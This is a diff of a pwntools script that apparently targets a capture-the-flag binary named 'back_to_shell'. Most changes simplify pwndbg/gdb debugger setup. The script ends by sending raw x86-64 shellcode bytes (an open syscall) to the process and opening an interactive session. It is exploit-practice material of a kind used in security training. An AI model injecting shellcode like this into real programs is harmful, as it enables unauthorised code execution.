@@ -1,46 +1,31 @@
 from pwn import *
-import os
-import shutil
+import os, shutil
 
 TARGET = "/home/k/ODC/c1/back_to_shell"
 
-# find system gdb
-GDB_BIN = shutil.which("gdb") or "/usr/bin/gdb"
-
-# derive pwndbg directory from the pwndbg wrapper location if possible
-PWNDBG_WRAPPER = shutil.which("pwndbg")  # /usr/local/bin/pwndbg (your case)
-pwndbg_init_candidates = []
-
-if PWNDBG_WRAPPER:
-    # second parent dir logic mirrored from wrapper: dir="$(dirname "$(dirname "$(realpath "$0")")")"
-    real = os.path.realpath(PWNDBG_WRAPPER)
-    parent = os.path.dirname(real)
-    pparent = os.path.dirname(parent)
-    # common places relative to that dir (match what wrapper uses)
-    pwndbg_init_candidates += [
-        os.path.join(pparent, "exe", "gdbinit.py"),
-        os.path.join(pparent, "gdbinit.py"),
-        os.path.join(pparent, "share", "pwndbg", "gdbinit.py"),
-    ]
-
-# fallback usual locations
-pwndbg_init_candidates += [
+# find pwndbg init if you want pwndbg loaded
+pwndbg_init = None
+candidates = [
+    "/usr/local/lib/pwndbg-gdb/exe/gdbinit.py",   # from your wrapper
     os.path.expanduser("~/.pwndbg/gdbinit.py"),
-    os.path.expanduser("~/.gdbinit"),   # maybe it already sources pwndbg
+    os.path.expanduser("~/.gdbinit"),
     "/usr/share/pwndbg/gdbinit.py",
-    "/usr/local/lib/pwndbg-gdb/exe/gdbinit.py",
 ]
+for c in candidates:
+    if os.path.exists(c):
+        pwndbg_init = c
+        break
 
-pwndbg_init = next((p for p in pwndbg_init_candidates if os.path.exists(p)), None)
-
-COMMANDS = "b *0x40116e\n"
-
+# build gdbscript: source pwndbg then set breakpoints
+gdbscript = ""
 if pwndbg_init:
-    gdbscript = f"source {pwndbg_init}\nset pagination off\nset breakpoint pending on\n{COMMANDS}"
-else:
-    # no pwndbg init found - still use system gdb
-    gdbscript = "set pagination off\nset breakpoint pending on\n" + COMMANDS
+    gdbscript += f"source {pwndbg_init}\n"
+gdbscript += "set pagination off\nset breakpoint pending on\nb *0x40116e\n"
 
-p = gdb.debug([TARGET], gdbscript=gdbscript, executable=GDB_BIN)
+# Launch process normally and attach gdb
+p = process(TARGET)
+gdb.attach(p, gdbscript=gdbscript)    # avoids pwntools' gdbserver usage
+# If you need to send payload after breakpoints, you can sleep or set breakpoint commands accordingly
 p.send(b"\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05")
 p.interactive()
+
